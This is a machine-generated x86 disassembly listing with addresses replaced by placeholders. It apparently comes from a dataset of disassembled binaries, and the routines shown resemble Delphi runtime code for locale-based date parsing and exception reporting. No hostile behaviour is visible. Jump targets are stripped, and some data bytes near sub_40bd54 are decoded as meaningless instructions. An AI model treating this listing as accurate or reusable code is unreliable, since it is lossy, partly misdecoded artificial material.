call sub_404424
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40ac10
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40acac
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40aa48
mov eax esi
call sub_404424
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409e20
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404424
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404684
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4081e0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404424
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404684
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4081e0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b04c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ab00
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ab00
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ab00
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40aa48
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ab00
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab8c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ab00
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab8c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40aa48
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4098f8
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ab00
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ab00
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ab8c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ab00
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b240
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ad08
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404424
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b274
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b04c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404424
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b2a8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ad08
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b274
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404424
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b04c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b334
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404254
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b380
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_4041b8
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404254
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b3cc
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b3f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b380
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405fc8
sub_40b430
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b543
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b3f4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4041b8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b3f4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4041b8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b3f4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041b8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b3f4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4041b8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b54a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404188
retn
sub_40b554
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40435c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b590
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b5f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40435c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4084c8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5fc
lea eax [ ebp - 0x4 ]
call sub_404164
retn
inc ebx
sub_40b608
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b69f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b380
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4084c8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6a6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b554
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b590
call EnumCalendarInfoA
sub_40b6b8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b882
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b380
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4084c8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404424
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b889
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404188
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b10
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c728
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404684
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40442c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_4041b8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408b10
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40442c
inc ebx
jmp r-xdata
mov eax esi
call sub_404424
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b10
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40442c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40442c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40442c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40434c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40442c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40434c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40442c
sub_40b8ec
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b8e0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c8ec
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408a34
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405534
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4032b8
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409058
mov eax [ ebp - 0x4 ]
call sub_4089d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404624
mov ebx eax
mov eax ebx
call sub_4089d0
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40ba74
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b8ec
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405534
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402bb0
call sub_402854
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4089d0
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bb3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4041b8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bbd2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409098
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bbd9
lea eax [ ebp - 0x4 ]
call sub_404164
retn
add esp 0xfffffff0
call sub_4036b4
sub_40bbd9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bbf8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405fc8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc34
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bca0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405fc8
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409098
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bca7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
add esp 0xfffffff0
call sub_4036b4
sub_40bca7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_40bcf4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028c8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bd54
pop eax
mov ebp 0xa0e0040
push esp
inc ebp
js r-xdata
jge r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40be64
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041fc
jmp r-xdata
push ebx
mov eax edx
jmp sub_403b1c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be6b
lea eax [ ebp - 0x20 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bb3c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bcf4
mov edx eax
sub_40bdc8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40be64
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be6b
lea eax [ ebp - 0x20 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40beb8
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bf50
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403ae4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4043d4
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4088e8
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c112
lea eax [ ebp - 0x170 ]
call sub_404164
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40c11c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c1d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40beb8
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bb3c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push ebp
call sub_40bf50
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c1de
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
mov ebx eax
sub_40c1f8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c1e8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bf38
mov eax [ rw-data ]
mov [ eax ] sub_40c11c
mov eax sub_40be84
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bea0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c27c
cmp [ rw-data ] 0x0
je r-xdata
